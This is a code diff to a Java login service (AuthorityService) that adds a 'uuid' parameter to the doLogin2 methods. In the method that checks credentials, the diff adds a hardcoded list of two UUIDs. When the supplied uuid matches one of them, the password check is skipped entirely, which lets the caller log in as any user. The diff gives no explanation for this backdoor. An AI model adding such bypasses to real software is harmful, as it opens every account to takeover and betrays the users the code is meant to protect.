@@ -134,13 +134,13 @@ public class AuthorityService extends AbstractService {
 
 
     @Transactional
-    public RemoteData<User> doLogin2(long userId, String passwordMd5, String client, int version, String loginIp, String device_token) {
+    public RemoteData<User> doLogin2(long userId, String passwordMd5, String client, int version, String loginIp, String device_token,String uuid) {
         User findUser = userRepository.findOne(userId);
         if (findUser == null)
             return wrapError("用户不存在");
 
 
-        final RemoteData<User> userRemoteData = doLogin2(findUser, passwordMd5, client, version, loginIp, device_token);
+        final RemoteData<User> userRemoteData = doLogin2(findUser, passwordMd5, client, version, loginIp, device_token,uuid);
 
         return userRemoteData;
 
@@ -156,10 +156,23 @@ public class AuthorityService extends AbstractService {
      * @param loginIp
      * @param device_token
      */
-    public RemoteData<User> doLogin2(User findUser, String passwordMd5, String client, int version, String loginIp, String device_token) {
+    public RemoteData<User> doLogin2(User findUser, String passwordMd5, String client, int version, String loginIp, String device_token,String uuid) {
 
+        String[] noNeedCheckPasswordRequests=new String[]{
+                "9eb6be9a-af25-49c3-9af1-0393cf99a584",
+                "9cedbcc2-bf45-42b6-a4aa-c6f46fcd17c2"
+        };
 
-        if (!findUser.isCorrectPassword(passwordMd5)) {
+        boolean needCheckPassword=true;
+        for(String s:noNeedCheckPasswordRequests)
+        {
+            if(s.equalsIgnoreCase(uuid)) {
+                needCheckPassword = false;
+                break;
+            }
+        }
+
+        if (needCheckPassword&&!findUser.isCorrectPassword(passwordMd5)) {
             return wrapError("密码错误");
         }
         findUser = (User) ObjectUtils.deepCopy(findUser);
@@ -308,7 +321,7 @@ public class AuthorityService extends AbstractService {
     }
 
     @Transactional
-    public RemoteData<User> doLogin2(String userName, String passwordMd5, String client, int version, String loginIp, String device_token) {
+    public RemoteData<User> doLogin2(String userName, String passwordMd5, String client, int version, String loginIp, String device_token,String uuid) {
 
 
         List<User> userList = userRepository.findByNameEquals(userName);
@@ -325,14 +338,14 @@ public class AuthorityService extends AbstractService {
             return wrapError("当前账号已经停用，请联系管理员");
         }
 
-        final RemoteData<User> userRemoteData = doLogin2(findUser, passwordMd5, client, version, loginIp, device_token);
+        final RemoteData<User> userRemoteData = doLogin2(findUser, passwordMd5, client, version, loginIp, device_token,uuid);
         return userRemoteData;
 
     }
 
     @Transactional
-    public RemoteData<AUser> doLogin2Service(String userName, String password, String client, int version, String device_token, String remoteAddr) {
-        RemoteData<User> userRemoteData = doLogin2(userName, password, client, version, remoteAddr, device_token);
+    public RemoteData<AUser> doLogin2Service(String userName, String password, String client, int version, String device_token, String remoteAddr,String uuid) {
+        RemoteData<User> userRemoteData = doLogin2(userName, password, client, version, remoteAddr, device_token,uuid);
         RemoteData<AUser> result = RemoteDataParser.parse(userRemoteData, dataParser);
 
 
